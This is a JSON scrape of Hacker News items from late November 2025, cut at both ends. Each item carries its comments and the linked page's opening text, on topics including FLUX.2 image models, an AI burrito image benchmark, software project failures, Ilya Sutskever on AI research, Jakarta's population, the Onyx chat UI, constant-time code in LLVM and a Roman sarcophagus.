    "first_paragraph": "back to homethis webpage is hosted on a drawer-bound fairphone 2 from 2015, running postmarketosin this tutorial you will be guided through the steps taken to get thereyou will end up with a small home server, able to run basic serviceswe aim to reduce e-waste, encourage reuse and give a second life to forgotten chipsyou will needfirst step is installing postmarketos on your phonefind your device in the devices page and verify that your device is properly supportedkeep that page open throughout the installationinstall pmbootstrap, the main command-line application for postmarketoswe'll first generate the image, then flash it to the deviceupdate the ports and initialize your device information:when asked for the codename for your device, provide the one listed in your device's page you opened abovewhen asked for which user interface to use, you can choose console (which should be the most minimal option) or fbkeyboard to have a minimal keyboard on-screen (which you shouldn't have to use"
  },
  {
    "title": "FLUX.2: Frontier Visual Intelligence (bfl.ai)",
    "points": 231,
    "submitter": "meetpateltech",
    "submit_time": "2025-11-25T15:47:14 1764085634",
    "num_comments": 68,
    "comments_url": "https://news.ycombinator.com/item?id=46046916",
    "comments": [
      "Updating the GenAI comparison website is starting to feel a bit Sisyphean with all the new models coming out lately, but the results are in for the Flux 2 Pro Editing model!https://genai-showdown.specr.net/image-editingIt scored slightly higher than BFL's Kontext model, coming in around the middle of the pack at 6 / 12 points.I\u2019ll also be introducing an additional numerical metric soon, so we can add more nuance to how we evaluate model quality as they continue to improve.If you're solely interested in seeing how Flux 2 Pro stacks up against the Nano Banana Pro, and another Black Forest model (Kontext), see here:https://genai-showdown.specr.net/image-editing?models=km,nbp...Note: It should be called out that BFL seems to support a more formalized JSON structure for more granular edits so I'm wondering if accuracy would improve using it.reply",
      "Great, especially that they still have an open-weight variant of this new model too.\nBut what happened to their work on their unreleased SOTA video model? did it stop being SOTA, others got ahead, and they folded the project, or what?\nYT video about it: https://youtu.be/svIHNnM1Pa0?t=208\nThey even removed the page of that: https://bfl.ai/up-next/reply",
      "As a startup, they pivoted and focused on image models (they are model providers, and image models often have more use cases than video models, not to mention they continue to have bigger image dataset moat, not video).reply",
      "I heard a possibly unsubstantiated rumor that they had a major failed training run with the video model and canceled the project.reply",
      "Makes no sense since they should have checkpoints earlier in the run that they could restart from and they should have regular checks that keep track if a model has exploded etc.reply",
      "I didn't read \"major failed training run\" as in \"the process crashed and we lost all data\" but more like \"After spending N weeks on training, we still didn't achieve our target(s)\", which could be considered \"failing\" as well.reply",
      "There's always a possibility that something implicit to the early model structure causes it to explode later, even if it's a well known, otherwise stable architecture, and you do everything right. A cosmic bit flip at the start of a training run can cascade into subtle instability and eventual total failure, and part of the hard decision making they have to do includes knowing when to start over.I'd take it with a grain of salt; these people are chainsaw jugglers and know what they're doing, so any sort of major hiccup was probably planned for. They'd have plan b and c, at a minimum, and be ready to switch - the work isn't deterministic, so you have to be ready for failures. (If you sense an imminent failure, don't grab the spinny part of the chainsaw, let it fall and move on.)reply",
      "Image models are more fundamentally important at this stage than video models.Almost all of the control in image-to-video comes through an image. And image models still needs a lot of work and innovation.On a real physical movie set, think about all of the work that goes into setting the stage. The set dec, the makeup, the lighting, the framing, the blocking. All the work before calling \"action\". That's what image models do and must do in the starting frame.We can get way more influence out of manipulating images than video. There are lots of great video models and it's highly competitive. We still have so much need on the image side.When you do image-to-video, yes you control evolution over time. But the direction is actually lower in terms of degrees of freedom. You expect your actors or explosions to do certain reasonable things. But those 1024x1024xRGB pixels (or higher) have way more degrees of freedom.Image models have more control surface area. You exercise control over more parameters. In video, staying on rails or certain evolutionary paths is fine. Mistakes can not just be okay, they can be welcome.It also makes sense that most of the work and iteration goes into generating images. It's a faster workflow with more immediate feedback and productivity. Video is expensive and takes much longer. Images are where the designer or director can influence more of the outcomes with rapidity.Image models still need way more stylistic control, pose control (not just ControlNets for limbs, but facial expressions, eyebrows, hair - everything), sets, props, consistent characters and locations and outfits. Text layout, fonts, kerning, logos, design elements, ...We still don't have models that look as good as Midjourney. Midjourney is 100x more beautiful than anything else - it's like a magazine photoshoot or dreamy Instagram feed. But it has the most lackluster and awful control of any model. It's a 2021-era model with 2030-level aesthetics. You can't place anything where you want it, you can't reuse elements, you can't have consistent sets... But it looks amazing. Flux looks like plastic, Imagen looks cartoony, and OpenAI GPT Image looks sepia and stuck in the 90's.  These models need to compete on aesthetics and control and reproducibility.That's a lot of work. Video is a distraction from this work.reply",
      "Hot take: text-to-image models should be biased toward photorealism. This is because if I type in \"a cat playing piano\", I want to see something that looks like a 100% real cat playing a 100% real piano. Because, unless specified otherwise, a \"cat\" is trivially something that looks like an actual cat. And a real cat looks photorealistic. Not like a painting, or cartoon, or 3D render, or some fake almost-realistic-but-cleary-wrong \"AI style\".reply",
      "FYI: photorealism is art that imitates photos, and I see the term misused a lot both in comments and prompts (where you'll actually get subideal results if you say \"photorealism\" instead of describing the camera that \"shot\" it!)reply"
    ],
    "link": "https://bfl.ai/blog/flux-2",
    "first_paragraph": "FLUX.2 is designed for real-world creative workflows, not just demos or party tricks. It generates high-quality images while maintaining character and style consistency across multiple reference images, following structured prompts, reading and writing complex text, adhering to brand guidelines, and reliably handling lighting, layouts, and logos. FLUX.2 can edit images at up to 4 megapixels while preserving detail and coherence.We believe visual intelligence should be shaped by researchers, creatives, and developers everywhere, not just a few. That\u2019s why we pair frontier capability with open research and open innovation, releasing powerful, inspectable, and composable open-weight models for the community, alongside robust, production-ready endpoints for teams that need scale, reliability, and customization.When we launched Black Forest Labs in 2024, we set out to make open innovation sustainable, building on our experience developing some of the world\u2019s most popular open models. We\u2019ve "
  },
  {
    "title": "The Generative Burrito Test (generativist.com)",
    "points": 71,
    "submitter": "pathdependent",
    "submit_time": "2025-11-25T23:28:17 1764113297",
    "num_comments": 40,
    "comments_url": "https://news.ycombinator.com/item?id=46052102",
    "comments": [
      "Oh wow, I've been hearing about Nano Banana Pro in random stuff lately, but as a layman the difference is stark.  It's the only one that actually looks like a partially eaten burrito at all to me. The others all look like staged marketing fake food, if I'm being generous (only a few actually approach that, most just look wrong).reply",
      "Hunyuan V3 is the only other one that plausibly has a bite taken. The weirdness of the fillings being decoratively sprinkled on top of it does rather count against it, though.reply",
      "Hide the evidence!reply",
      "The NBP looks like a mock of food to me - the unwrapped burrito on a single piece of intact tinfoil, a table where the grain goes all wonky, an almost pastry looking tortilla, hyperrealistic beans and there's something wrong with the focal plane.It's just not as plasticy and oversaturated as the others.reply",
      "Hyperrealistic beans? The focal plane? You are reaching really hard here.The table grain is the only thing that gives it away - if it weren't for that no one without advance warning is going to notice that it's not real.reply",
      "I am a huge AI skeptic, check my comment history.I agree with you. The Nano Banana Pro burrito is almost perfect, the wood grain direction/perspective is the only questionable element.Almost no one would ID that as being AI.reply",
      "Yeah, hyperrealistic beans. They don't look real at all. The inside of an actual burrito is messy after you bite into it (and usually before). That burrito has a couple of nearly dry, yet for some reason speckled, beans that look more like they're floating on top of the burrito rather than actually in it.And yeah, the focal plane is wonky. If you try to draw a box around what's in focus, you end up with something that does not make sense given where the \"camera\" is - like the focal plane runs at a diagonal - so you have the salsa all in perfect focus, but for some reason one of the beans which appears to be the exact same distance away, it subtly out of focus.I mean, it's not bad, but it doesn't actually look like a real burrito either.reply",
      "This shows some gaps in the \"same prompt to every model\" approach to benchmarking models.I get that it's allows ensuring you're testing the model capabilities vs prompts, but most models are being post-trained with very different formats of prompting.I use Seedream in production so I was a little suspicious of the gap: I passed Bytedance's official prompting guide, OPs prompt, and your feedback to Claude Opus 4.5 and got this prompt to create a new image:> A partially eaten chicken burrito with a bite taken out, revealing the fillings inside: shredded cheese, sour cream, guacamole, shredded lettuce, salsa, and pinto beans all visible in the cross-section of the burrito. Flour tortilla with grill marks. Taken with a cheap Android phone camera under harsh cafeteria lighting. Compostable paper plate, plastic fork, messy table. Casual unedited snapshot, slightly overexposed, flat colors.Then I generated with n=4 and the 'standard' prompt expansion setting for Seedream 4.0 Text To Image:https://imgur.com/a/lxKyvlmThey're still not perfect (it's not adhering to the fillings being inside for example) but it's massively better than OP's resultShows that a) random chance plays a big part, so you want more than 1 sample and b) you don't have to \"cheat\" by spending massive amounts of time hand-iterating on a single prompt either to get a better resultreply",
      "100%. Between tuning prompt variations depending on the model and allowing a minimum number of re-rolls, this is why it takes a while to publish results from the newest models on my GenAI comparison site.Including a \"total rolls\" is a very valuable metric since it helps indicate how steerable the model is.reply",
      "not adhering to the prompt guide is def a valid strong criticism. resampling i think less so for the demo just because fewer people look at k samples per model, so just taking literally the first one has the fewest of my own biases injected into itreply"
    ],
    "link": "https://www.generativist.com/notes/2025/Nov/25/generative-burrito-test.html",
    "first_paragraph": "A CRITICAL benchmark for image generation modelsThis was originally inspired by the horse riding astronaut meme way back in 2023. But I think Simon's Pelican benchmark is what keeps the idea alive for me, even though they are testing different modalities. Burritos are obviously more important than both pelicans and equestrian absurdism.Also, I was initially surprised that it couldn't replicate the image well because I assumed there would be plenty of similar examples in the training data (unlike said equestrian absurdity). But I think it's a bit of a weird concept because all the ingredients get smushed and smashed and congealed.All images generated using fal defaults. Obviously you can probably prompt it better, but that's HIL effort, and feels like cheating.The Promptfal.aifal.aifal.aifal.aifal.aifal.aifal.aifal.aifal.aifal.aifal.aifal.aifal.aifal.aifal.aifal.aifal.aifal.aifal.aifal.aifal.aifal.aifal.aifal.ai"
  },
  {
    "title": "Trillions spent and big software projects are still failing (ieee.org)",
    "points": 302,
    "submitter": "pseudolus",
    "submit_time": "2025-11-25T12:14:11 1764072851",
    "num_comments": 272,
    "comments_url": "https://news.ycombinator.com/item?id=46045085",
    "comments": [
      "It's a great article, until the end where they say what the solution would be.  I'm afraid that the solution is: build something small, and use it in production before you add more features.  If you need to make a national payroll, you have to use it for a small town with a payroll of 50 people first, get the bugs worked out, then try it with a larger town, then a small city, then a large city, then a province, and then and only then are you ready to try it at a national level.  There is no software development process which reliably produces software that works at scale without doing it small, and medium sized, first, and fixing what goes wrong before you go big.reply",
      "> If you need to make a national payroll, you have to use it for a small town with a payroll of 50 people first, get the bugs worked out, then try it with a larger town, then a small city, then a large city, then a province, and then and only then are you ready to try it at a national level.At a large box retail chain (15 states, ~300 stores) I worked on a project to replace the POS system.The original plan had us getting everything working (Ha!) and then deploying it out to stores and then ending up with the two oddball \"stores\".  The company cafeteria and surplus store were technically stores in that they had all the same setup and processes but were odd.When the team that I was on was brought into this project, we flipped that around and first deployed to those two several months ahead of the schedule to deploy to the regular stores.In particular, the surplus store had a few dozen transactions a day.  If anything broke, you could do reconciliation by hand. The cafeteria had single register transaction volume that surpassed a surplus store on most any other day.  Furthermore, all of its transactions were payroll deductions (swipe your badge rather than credit card or cash).  This meant that if anything went wrong there we weren't in trouble with PCI and could debit and credit accounts.Ultimately, we made our deadline to get things out to stores.  We did have one nasty bug that showed up in late October (or was it early November?) with repackaging counts (if a box of 6 was $24 and if purchased as a single item it was $4.50 ... but if you bought 6 single items it was \"repackaged\" to cost $24 rather than $27) which interacted with a BOGO sale.  That bug resulted in absurd receipts with sales and discounts (the receipt showed you spent $10,000 but were discounted $9,976 ... and then the GMs got alerts that the store was not able to make payroll because of a $9,976 discount ... one of the devs pulled an all nighter to fix that one and it got pushed to the stores ).I shudder to think about what would have happened if we had tried to push the POS system out to customer facing stores where the performance issues in the cafeteria where worked out first or if we had to reconcile transactions to hunt down incorrect tax calculations.reply",
      "You could have, in principle, implemented the new system to be able to run in \"dummy mode\" alongside the existing system at regular stores, so that you see that it produces the 'same' results in terms of what the existing system is able to provide.Which is to say, there is more than one approach to gradual deployment.reply",
      "Not easily when issues of PCI get in there.Things like the credit card reader (and magnetic ink reader for checks), different input device (sending the barcode scanner two two different systems), keyboard input (completely different screens and keyed entry) would have made those hardware problems also things that needed to be solved.The old system was a DOS based one where a given set of Fkeys were used to switch between screens on a .  Need to do hand entry of a SKU?  That was F4 and then type the number.  Need to do a search for the description of an item? That was F5.   The keyboard was particular to that register setup and used an old school XT (5 pin DIN) plug.  The new systems were much more modern linux boxes that used USB plugs.  The mag strip reader was flashed to new screens (and the old ones were replaced).For this situation, it wasn't something that we could send keyboard, scanner, and credit card events to another register.reply",
      "That's what works for products, not software systems. Gradual growth inevitably results in loads of technical debt that is not paid off as Product adds more feature requests to deliver larger and larger sales contracts. Eventually you want to rewrite to deal with all the technical debt, but nobody has enough confidence to say what is in the codebase that's important to Product and what isn't, so everybody is afraid and frozen.Scale is separately a Product and Engineering question. You are correct that you cannot scale a Product to delight many users without it first delighting a small group of users. But there are plenty of scaled Engineering systems that were designed from the beginning to reach massive scale. WhatsApp is probably the canonical example of something that was a rather simple Product with very highly scaled Engineering and it's how they were able to grow so much with such a small team.reply",
      "Software is a component of a product, if not the product itself. Treating software like a product, besides being the underlying truth, also means it makes sense to manage it like one.Technical debt isn\u2019t usually the problem people think it is. When it does become a problem, it\u2019s best to think of it in product-like terms. Does it make the product less useful for its intended purpose? Does it make maintenance or repair inconvenient or costly? Or does it make it more difficult or even impossible to add competitive features or improvements? Taking a product evaluation approach to the question can help you figure out what the right response is. Sometimes it\u2019s no response at all.reply",
      "Designing or intending a system to be used at massive scale is not the same as building and deploying it so that it only initially runs at that massive scale.That's just a recipe for disaster, \"We don't even know if we can handle 100 users, let's now force 1 million people to use the system simultaneously.\" Even WhatsApp couldn't handle hundreds of millions of users on the day it was first released, nor did it attempt to. You build out slowly and make sure things work, at least if you're competent and sane.reply",
      "Sure, but if you did a good job, the gradual deployment can go relatively quickly and smoothly, which is how $FAANG roll out new features and products to very large audiences. The actual rollout is usually a bit of an implementation detail of what first needed to be architected to handle that larger scale.reply",
      "You get certain big pieces correct maybe but you\u2019d be surprised how many mistakes get made. For example, I had designed the billing system for a large distributed product that the engineer ended up implementing not as described in the spec which fell down fairly quickly with even a modicum of growth.reply",
      "No but whatsapp was built by 2 guys that had previously worked at Yahoo, and they picked a very strong tech for the backend: erlang.So while they probably didn't bother scaling the service to millions in the first version, they 1) knew what it would take, 2) chose already from the ground up a good technology to have a smoother transition to your \"X millions users\". The step \"X millions to XYZ millions and then billions\" required other things too.At least they didn't have to write a php-to-C++ compiler for Php like Facebook had, given the initial design choice of Mark Zuckeberg, which shows exactly what it means to begin something already with the right tool and ideas in mind.But this takes skills.reply"
    ],
    "link": "https://spectrum.ieee.org/it-management-software-failures",
    "first_paragraph": "AI won\u2019t solve IT\u2019s management problems\u201cWhy worry about something that isn\u2019t going to happen?\u201dKGB Chairman Charkov\u2019s question to inorganic chemist Valery Legasov in HBO\u2019s \u201cChernobyl\u201d miniseries makes a good epitaph for the hundreds of software development, modernization, and operational failures I have covered for IEEE Spectrum since my first contribution, to its September 2005 special issue on learning\u2014or rather, not learning\u2014from software failures. I noted then, and it\u2019s still true two decades later: Software failures are universally unbiased. They happen in every country, to large companies and small. They happen in commercial, nonprofit, and governmental organizations, regardless of status or reputation.Global IT spending has more than tripled in constant 2025 dollars since 2005, from US $1.7 trillion to $5.6 trillion, and continues to rise. Despite additional spending, software success rates have not markedly improved in the past two decades. The result is that the business and so"
  },
  {
    "title": "Ilya Sutskever: We're moving from the age of scaling to the age of research (dwarkesh.com)",
    "points": 183,
    "submitter": "piotrgrabowski",
    "submit_time": "2025-11-25T17:21:52 1764091312",
    "num_comments": 153,
    "comments_url": "https://news.ycombinator.com/item?id=46048125",
    "comments": [
      ">You could actually wonder that one possible explanation for the human sample efficiency that needs to be considered is evolution. Evolution has given us a small amount of the most useful information possible.It's definitely not small. Evolution performed a humongous amount of learning, with modern homo sapiens, an insanely complex molecular machine, as a result. We are able to learn quickly by leveraging this \"pretrained\" evolutionary knowledge/architecture. Same reason as why ICL has great sample efficiency.Moreover, the community of humans created a mountain of knowledge as well, communicating, passing it over the generations, and iteratively compressing it. Everything that you can do beyond your very basic functions, from counting to quantum physics, is learned from the 100% synthetic data optimized for faster learning by that collective, massively parallel, process.It's pretty obvious that artificially created models don't have synthetic datasets of the quality even remotely comparable to what we're able to use.reply",
      "Aren't you agreeing with his point?The process of evolution distilled down all that \"humongous\" amount to what is most useful. He's basically saying our current ML methods to compress data into intelligence can't compare to billions of years of evolution. Nature is better at compression than ML researchers, by a long shot.reply",
      "The impactful innovations in AI these days aren't really from scaling models to be larger. It's more concrete to show higher benchmark scores, and this implies higher intelligence, but this higher intelligence doesn't necessarily translate to all users feeling like the model has significantly improved for their use case. Models sometimes still struggle with simple questions like counting letters in a word, and most people don't have a use case of a model needing phd level research ability.Research now matters more than scaling when research can fix limitations that scaling alone can't. I'd also argue that we're in the age of product where the integration of product and models play a major role in what they can do combined.reply",
      "> this implies higher intelligenceNot necessarily. The problem is that we can't precisely define intelligence (or, at least, haven't so far), and we certainly can't (yet?) measure it directly. And so what we have are certain tests whose scores, we believe, are correlated with that vague thing we call intelligence in humans. Except these test scores can correlate with intelligence (whatever it is) in humans and at the same time correlate with something that's not intelligence in machines. So a high score may well imply high intellignce in humans but not in machines (e.g. perhaps because machine models may overfit more than a human brain does, and so an intelligence test designed for humans doesn't necessarily measure the same thing we think of when we say \"intelligence\" when applied to a machine).This is like the following situation: Imagine we have some type of signal, and the only process we know produces that type of signal is process A. Process A always produces signals that contain a maximal frequency of X Hz. We devise a test for classifying signals of that type that is based on sampling them at a frequency of 2X Hz. Then we discover some process B that produces a similar type of signal, and we apply the same test to classify its signals in a similar way. Only, process B can produce signals containing a maximal frequency of 10X Hz and so our test is not suitable for classifying the signals produced by process B (we'll need a different test that samples at 20X Hz).reply",
      "My definition of intelligence is the capability to process and formalize a deterministic action from given inputs as transferable entity/medium.\nIn other words knowing how to manipulate the world directly and indirectly via deterministic actions and known inputs and teach others via various mediums.\nAs example, you can be very intelligent at software programming, but socially very dumb (for example unable to socially influence others).As example, if you do not understand another person (in language) and neither understand the person's work or it's influence, then you would have no assumption on the person's intelligence outside of your context what you assume how smart humans are.ML/AI for text inputs is stochastic at best for context windows with language or plain wrong, so it does not satisfy the definition. Well (formally) specified with smaller scope tend to work well from what I've seen so far.\nKnown to me working ML/AI problems are calibration/optimization problems.What is your definition?reply",
      "> My definition of intelligence is the capability to process and formalize a deterministic action from given inputs as transferable entity/medium.I don't think that's a good definition because many deterministic processes - including those at the core of important problems, such as those pertaining to the economy - are highly non-linear and we don't necessarily think that \"more intelligence\" is what's needed to simulate them better. I mean, we've proven that predicting certain things (even those that require nothing but deduction) require more computational resources regardless of the algorithm used for the prediction. Formalising a process, i.e. inferring the rules from observation through induction, may also be dependent on available computational resources.> What is your definition?I don't have one except for \"an overall quality of the mental processes humans present more than other animals\".reply",
      "Fair, I think it would be more appropriate to say higher capacity.reply",
      "Ok, but the point of a test of this kind is to generalise its result. I.e. the whole point of an intelligence test is that we believe that a human getting a high score on such a test is more likely to do some useful things not on the test better than a human with a low score. But if the problem is that the test results - as you said - don't generalise as we expect them, then the tests are not very meaningful to begin with. If we don't know what to expect from a machine with a high test score when it comes to doing things not on the test, then the only \"capacity\" we're measuring is the capacity to do well on such tests, and that's not very useful.reply",
      "\"Scaling\" is going to eventually apply to the ability to run more and higher fidelity simulations such that AI can run experiments and gather data about the world as fast and as accurately as possible. Pre-training is mostly dead. The corresponding compute spend will be orders of magnitude higher.reply",
      "That's true, I expect more inference time scaling and hybrid inference/training time scaling when there's continual learning rather than scaling model size or pretraining compute.reply"
    ],
    "link": "https://www.dwarkesh.com/p/ilya-sutskever-2",
    "first_paragraph": ""
  },
  {
    "title": "Jakarta is now the biggest city in the world (axios.com)",
    "points": 240,
    "submitter": "skx001",
    "submit_time": "2025-11-25T06:09:05 1764050945",
    "num_comments": 146,
    "comments_url": "https://news.ycombinator.com/item?id=46042810",
    "comments": [
      "I used to spend a lot of time in Jakarta for work, and it's an underrated city. Yes, it's hot, congested, polluted and largely poor, but so is Bangkok.Public transport remains not great, but it's improved a lot with the airport link, the metro, LRT, Transjakarta BRT. SE Asia's only legit high speed train now connects to Bandung in minutes. Grab/Gojek (Uber equivalents) make getting around cheap and bypass the language barrier. Hotels are incredible value, you can get top tier branded five stars for $100. Shopping for locally produced clothes etc is stupidly cheap. Indonesian food is amazing, there's so much more to it than nasi goreng, and you can find great Japanese, Italian, etc too; these are comparatively expensive but lunch at the Italian place in the Ritz-Carlton was under $10. The nightlife scene is wild, although you need to make local friends to really get into it. And it's reasonably safe, violent crime is basically unknown and I never had problems with pickpockets (although they do exist) or scammers.I think Jakarta's biggest problems are lack of marketing and top tier obvious attractions. Bangkok has royal palaces and temples galore plus a wild reputation for go-go bars etc, Jakarta does not, so nobody even considers it as a vacation destination.reply",
      "I was there ~20 years ago.  I had made friends with some Indonesia students in college and joined them on a trip home.  We were mostly in Surabaya, but did spend some time in Jakarta as well.  We had a great time.The language is a hidden gem, you can learn enough to get around on the flight over which I can't say about any other SEA language.  Phonetic spellings, Latin alphabet, no tonal sounds, dead easy grammar and a million loan words you already know.Jakarta is definitely for the adventurous though, and you had better have an iron stomach.reply",
      "> ...which I can't say about any other SEA language. Phonetic spellings, Latin alphabet, no tonal sounds, dead easy grammar and a million loan words you already know.Nitpick: Sounds a lot like Tagalog (Filipino), another SEA language.reply",
      "I've never studied it, but my understanding is that like Japanese, Tagalog has the pitched/stressed thing going on.  My wife is Japanese and holy cow I can't tell the difference.  Bridge or Chopstick?  No idea, they sound exactly the same to my ears...I'm pretty fluent, but my pronunciation was as good as it's gonna get like 10 years ago which is a frustration.reply",
      "Japanese pitch accent actually varies across regions. Some have no pitch accent at all! I think this shows that it's not very important unless you want to sound like a native speaker. I never bothered to learn the \"standard\" pitch accents but I tend to imitate the Kansai pitch accent of my wife :)reply",
      "In Japan/ese, the pitch/stress thing is overrated, and so are regional language differences.  When natives point it out to me, it strikes me a little more than cultural gatekeeping.  Linguistic context matters much more.  How often are you listening to your own native language and you are confused by two words that sounds similar (like 'hashi' in Japanese for bridge/chopsticks)?  Almost never.  Advice: Ignore it when natives that criticise your pronunciation.  Ask them how is their German or Thai is... and they will freeze with shame.Where I come from, to criticise a non-native speakers accent or small grammatical errors (that do not impact the meaning) is a not-so-subtle form of discrimination.  As a result, I never do it.  (To criticise myself, it tooks many, many years to see this about my home culture and stop doing it myself.)  Still, many people ask me: \"Hey, can you correct my <language X> when I speak it?\"  \"Sure!\" (but I never do.)reply",
      ">How often are you listening to your own native language and you are confused by two words that sounds similarIt confuses the hell out of me when non-natives misplace stress in Ukrainian and use wrong cases. It's that I want to gatekeep, but above certain rate of mistakes it's just difficult to follow what is being said.reply",
      "Both are Austronesian languagesreply",
      "most SEA languages are similar btwreply",
      "How did the language end up with a Latin alphabet?reply"
    ],
    "link": "https://www.axios.com/2025/11/24/jakarta-tokyo-worlds-biggest-city-population",
    "first_paragraph": ""
  },
  {
    "title": "Launch HN: Onyx (YC W24) \u00e2\u20ac\u201c Open-source chat UI",
    "points": 165,
    "submitter": "Weves",
    "submit_time": "2025-11-25T14:20:30 1764080430",
    "num_comments": 117,
    "comments_url": "https://news.ycombinator.com/item?id=46045987",
    "comments": [
      "This was funded by YC? Why? It's more of a developer project/tool. It will become useless really quickly.reply",
      "This is great, the value is there. I work for a F100 company that is trying (and failing) to build this in house because every product manager fundamentally misunderstands that users just want a chat window for AI, not to make their own complicated agents. Your biggest competition in the enterprise space, Copilot, has terrible UI and we only put up with it because it has access to email, SharePoint and Teams.reply",
      "Haha, yea we've seen that exact story many times! Dissatisfied with Copilot and building a (not great) internal solution that is missing polish + most of the \"advanced\" feature set.reply",
      "I immediately thought of Google's Agentspace when I saw this product. The value for me sits in its ability to do RAG via connectors.reply",
      "RAG + connectors is a huge reason why people deploy Onyx (enterprise search roots means we do a pretty good job there).Also, open-source works really here, since connectors are a long-tail game. We've tried to make it easy to add connectors (a single python interface), and as a result over half of our connectors are contributed by the community. We expect that percentage to grow over time. This means that compared to something like Agentspace, we'll very likely be connected to all of the key tools at your company (and if we aren't, you can easily add an integration).reply",
      "In a landscape where every week we have a different leading model, these systems are really useful for the power users because they keep the interface and models constant and allow to switch easily using API via openrouter or naga. I have been using openwebui which is under active development but I'll give this a try.reply",
      "Yes, exactly! Would love to hear your feedback compared to OpenWebUIreply",
      "One thing I really care about is extensibility. Every now and then one of the big consumer apps adds a feature I really like and the self-hosted solution should have some way to integrate that.The main thing I really care about is voice mode, as that's my far preferred way of interacting with LLMs for longer backs and forths (most apps I've seen disable a lot of other functionality during it, which I hate, btw).Two other things I would like to see are canvas mode and scheduled actions (with decision making capability - e.g. \"send a notification if X happens\").I assume such features are going to continue being invented, so I find extensibility to be a huge deal. So much so that one thing I could imagine going really well would be a UI on top of Langchain, which already has most of the facilities for that!reply",
      "Does it support multimodal documents?My main gripe with openwebui, in addition to it being slow is the fact that it mangles documents in the OCR step. tables that could have been understood great by an multi modal llm, just gets mangled by the ocr and lost instead of storing both a text and original representation.Being able to properly searcbin the knowlege base lime the llm does, but manually would be nice (like get recommendations for docs to add).My usecase is mostly writing, so having a integrated document refinery editor is also a nice feature list.I'm probably rambling but these are my base use-cases for a llm ui I personally have found.reply",
      "What format are the docs being uploaded as? By default, images uploaded into the chat would be directly passed through. PDFs would be parsed and fed to the LLM as text.Writing is a really common use case, and something we'd like to explore more. Currently people often use Onyx for \"write something combining X, Y, and Z documents\", but I feel that's just scratching the surface.reply"
    ],
    "link": "item?id=46045987",
    "first_paragraph": ""
  },
  {
    "title": "Constant-time support coming to LLVM: Protecting cryptographic code (trailofbits.com)",
    "points": 41,
    "submitter": "ahlCVA",
    "submit_time": "2025-11-25T13:02:06 1764075726",
    "num_comments": 16,
    "comments_url": "https://news.ycombinator.com/item?id=46045385",
    "comments": [
      "This has been a sore point in a lot of discussions regarding compiler optimizations and cryptographic code, how compilers and compiler engineers are sabotaging the efforts of cryptographers in making sure there are no side-channels in their code. The issue has never been the compiler, and has always been the language: there was never a way to express the right intention from within C (or most other languages, really).This primitive we're trying to introduce is meant to make up for this shortcoming without having to introduce additional rules in the standard.reply",
      "What happened to the blog post? It was moved and now it has disappeared :-(reply",
      "Archived copy here: https://archive.is/tIXt7reply",
      ">how compilers and compiler engineers are sabotaging the efforts of cryptographersI'm not exposed to this space very often, so maybe you or someone else could give me some context. \"Sabotage\" is a deliberate effort to ruin/hinder something. Are compiler engineers deliberately hindering the efforts of cryptographers? If yes... is there a reason why? Some long-running feud or something?Or, through the course of their efforts to make compilers faster/etc, are cryptographers just getting the \"short end of the stick\" so to speak? Perhaps forgotten about because the number of cryptographers is dwarfed by the number of non-cryptographers? (Or any other explanation that I'm unaware of?)reply",
      "It's more a viewpoint thing. Any construct cryptographers find that runs in constant time is something that could be optimized to run faster for non-cryptographic code. Constant-time constructs essentially are optimizer bug reports. There is always the danger that by popularizing a technique you are drawing the attention of a compiler contributor who wants to speed up a benchmark of that same construct in non-cryptographic code. So maybe it's not intended as sabotage, but it can sure feel that way when everything you do is explicitly targeted to be changed after you do it.reply",
      "It\u2019s not intentional. The motivations of CPU designers, compiler writers, and optimizers are at odds with those of cryptographers. The former want to use every trick possible to squeeze out additional performance in the most common cases, while the latter absolutely require indistinguishable performance across all possibilities.CPUs love to do branch prediction to have computation already performed in the case where it guesses the branch correctly, but cryptographic code needs equal performance no matter the input.When a programmer asks for some register or memory location to be zeroed, they generally just want to be able to use a zero in some later operation and so it doesn\u2019t really matter that a previous value was really overwritten. When a cryptographer does, they generally are trying to make it impossible to read the previous value. And they want to be able to have some guarantee that it wasn\u2019t implicitly copied somewhere else in the interim.reply",
      "\u201cSabotage\u201d can be used in a figurative sense that doesn\u2019t insinuate intent.  An adjacent example is \u201cself-sabotage\u201d, which doesn\u2019t imply intent.reply",
      "Since the sibling comment is dead and thus I can\u2019t reply to it: Search for \u201cunintentional sabotage\u201d, which should illustrate the usage. Despite appearances, it isn\u2019t an oxymoron. See also meaning 3a on https://www.merriam-webster.com/dictionary/sabotage.reply",
      "> making sure there are no side-channels in their codeAny side effect is a side channel. There are always going to be side channels in real code running on real hardware.Sure you can change your code, compiler, or, or even hardware to account for this but at it's core that is security by obscurity.reply",
      "So this makes me curious: is there a reason we don't do something like a __builtin_ct_begin()/__builtin_ct_end() set of intrinsics? Where the begin intrinsic begins a constant-time code region, and all code within that region must be constant-time, and that region must be ended with an end() call? I'm not too familiar with compiler intrinsics or how these things work so thought I'd ask. The intrinsic could be scoped such that the compiler can use it's implementation-defined behavior freedom to enforce the begin/end pairs. But Idk, maybe this isn't feasible?reply"
    ],
    "link": "https://blog.trailofbits.com/2025/11/25/constant-time-support-coming-to-llvm-protecting-cryptographic-code-at-the-compiler-level/",
    "first_paragraph": ""
  },
  {
    "title": "1,700-year-old Roman sarcophagus is unearthed in Budapest (apnews.com)",
    "points": 18,
    "submitter": "gmays",
    "submit_time": "2025-11-24T22:17:40 1764022660",
    "num_comments": 8,
    "comments_url": "https://news.ycombinator.com/item?id=46040053",
    "comments": [
      "\"Excavators also removed a layer of mud roughly 4 centimeters (1.5 inches) thick from inside the coffin that F\u00e9nyes hopes could contain more treasures.\"i strongly suspect this is not \"mud\" but the dried precipitate of liquified soft tissue, [coffin liquor] and condensation.reply",
      "There's something about how this article was written that reads like grave robbing, especially the bit about them hoping to discover \"more treasures.\"reply",
      "Where did the mud inside come from if it was still sealed?reply",
      "limestone is porous and will allow water to eventually seep through.a condensation cycle will occur, and drip percolate the soft tissue and adipocere into a slurry [coffin liquor] that will settle to the bottom of the sarcophagus.reply",
      "I honestly cannot believe that I have been listening to Death Metal my entire life, and no one has ever used the term \u201ccoffin liquor\u201d in a song.reply",
